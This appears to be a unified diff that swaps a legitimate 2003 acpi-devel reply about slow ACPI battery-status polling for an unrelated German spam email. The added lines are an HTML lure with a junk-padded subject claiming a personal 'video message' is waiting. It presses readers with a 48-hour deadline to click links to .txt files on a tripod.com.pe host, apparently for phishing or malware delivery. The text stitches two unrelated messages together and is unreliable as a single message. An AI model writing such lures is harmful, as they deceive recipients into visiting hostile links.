@@ -1,14 +1,12 @@
-From: Bas Mevissen <ml-Y9IUUvl1dgU0Iwp8Nzs06g@public.gmane.org>
-Subject: Re: Battery status reading problems
-Date: Tue, 23 Sep 2003 14:14:43 +0200
+From: "Katja Gerson" <Lbtja-OC2xQstClsUqcZcGjlUOXw@public.gmane.org>
+Subject: Video Botschaft für Acpidevel aufgenommen...      ELnUraf    PvORdsq  GpsSgWNqIDHv  HCGrLwu  CICtuV    TopquFAV  HhlxvaeqD   PmFbt    hFUIBCk     WIpcIKyBuqW    WAbFiSWBCjE   cmeBRI     qtqWFNEhcl  SxPtB  dfVnYuD     bQRaKRS   iFQE   gxdsCGv     krRfwTwlKBL  bGpxeqiePkRX     OBYqEnMes uYfPXVJvNSF       JojIR oFAQQEnr      IKX  YeyApjhx     FrFKoOAd   UPKEA vUujRyQpyR     wGhFH   KnpJnp    xpqfjhdu    jDFdc     LROUnEQqpkF  TcrKCqOr       YdGrIEU       keE     XTAMirsmo    dkRSgNsWRp       rfy      ojbaPWW  gqPcsN yviUC     Ofb  EucYvkkLIQ      TEAA  arcwqyE     RcSW  PJBCpv  dfBbeQt   ULIkWjlVcDim   ePuLcUrlXy
+Date: Tue, 23 Sep 2003 05:28:19 -0700
 Sender: acpi-devel-admin-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
-Message-ID: <3F703933.50604@basmevissen.nl>
-References: <m2vfrpthxt.fsf@tnuctip.rychter.com>	 <Pine.LNX.4.58.0309192257480.1613@phoenix.kerstin.at>	 <3F6EAADC.4020509@basmevissen.nl>	 <Pine.LNX.4.53.0309220954120.9385@dynast.gaugusch.at> <1064230622.8592.14.camel@dhcp23.swansea.linux.org.uk>
+Message-ID: <E1A1mHC-000794-Lf@sc8-sf-mx1.sourceforge.net>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii; format=flowed
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/alternative;
+	boundary="----=_NextPart_000_001A_02A85B51.B8CA7258"
 Return-path: <acpi-devel-admin-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org>
-In-Reply-To: <1064230622.8592.14.camel-Z+iYsftfazAXoXS6vNje7nviChZXdy279dF7HbQ/qKg@public.gmane.org>
 Errors-To: acpi-devel-admin-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
 List-Help: <mailto:acpi-devel-request-5NWGOfrQmneRv+LV9MX5utDmRdBvX5/5lLLH9aP38KF1pqr+6INuaA@public.gmane.org>
 List-Post: <mailto:acpi-devel-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org>
@@ -17,27 +15,18 @@ List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/acpi-devel>,
 List-Unsubscribe: <https://lists.sourceforge.net/lists/listinfo/acpi-devel>,
 	<mailto:acpi-devel-request-5NWGOfrQmneRv+LV9MX5utDmRdBvX5/5ji9XKYC2TYK4Io4DoRGLOrNAH6kLmebB@public.gmane.org>
 List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum=acpi-devel>
-To: Alan Cox <alan-qBU/x9rampVanCEyBjwyrvXRex20P6io@public.gmane.org>
-Cc: Markus Gaugusch <markus-z+rTbpWsRgbk7+2FdBfRIA@public.gmane.org>, acpi-devel-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
 List-Id: linux-acpi@vger.kernel.org
 
-Alan Cox wrote:
->  
-> Several vendors implement the actual battery reading logic as an SMI
-> trap and disable interrupts during their slow chat with the battery.
-> There isnt much anyone can do about that bit alas (except read it a lot
-> less often)
-> 
+This is a multi-part message in MIME format.
 
-OK. I'll check with Win XP and Linux with latest ACPI CA to see if I 
-notice a speed difference between Windows and Linux. The XP battery 
-indicator detects AC/battery power changes in a few seconds, so I expect 
-the batery status polling in Windows to occur at the same speed.
+------=_NextPart_000_001A_02A85B51.B8CA7258
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
 
-(or does the AC/battery power work with an event? The my assumption 
-won't hold then)
-
-Bas.
+Hallo Acpidevel,<br><br>=0D=0A=0D=0AAuf unserem Server wurde eine Videobotschaft von <br>=0D=0A"Du kennst mich" f=FCr " Acpidevel " aufgenommen.<br><br>=0D=0ABitte rufen Sie Ihre pers=F6nliche Videobotschaft innerhalb der n=E4chsten 48 Stunden unter folgendem Link ab:<br>=0D=0A<a=20href=3D"http://kloklo.tripod.com.pe/xyzxyz.txt?sid=3D1016111A4455071A0404750B1C17114B401208144013100E56010F0C5A5B06065B47075B5A564C055247421F445443501C50555458">Hier gehts zur Nachricht</a><br><br>=0D=0ASie k=F6nnen, wenn Sie die Botschaft nicht anschauen wollen, diese von unserem Server l=F6schen. Sie verhindern damit auch, dass Sie diese Mail nochmals empfangen.<br>=0D=0A<a=20href=3D"http://neu.tripod.com.pe/loeschen.txt?sid=3D154113181A580609210F581F5B0A004C5452575807424D5F0C4745114500534B4C41095C5F">Hier klicken, um Botschaft zu l=F6schen</a><br><br>=0D=0AViel Spass mit Ihrer Nachricht. <br><br>=0D=0A=0D=0A=0D=0A<i>Automatische Nachricht von Video Team,</i><br><br>=0D=0A<i>Dies ist eine automat
+ isierte eMail, daher bitte nicht darauf antworten!!!</i><br><br>=0D=0AInformation:<br>=0D=0A<i>Da=20unser Service zurzeit des =F6fteren benutzt wird,=0D=0Akommt es des =F6fteren auch zu Serverausf=E4llen. =0D=0ADaher k=F6nnen wir jede VideoBotschaft nur 72 Stunden=0D=0Afesthalten, bis sie automatisch gel=F6scht wird.=0D=0AAlso bitte schauen dir die eingetroffene Botschaft sofort an. </i>
+------=_NextPart_000_001A_02A85B51.B8CA7258--
 
 
 
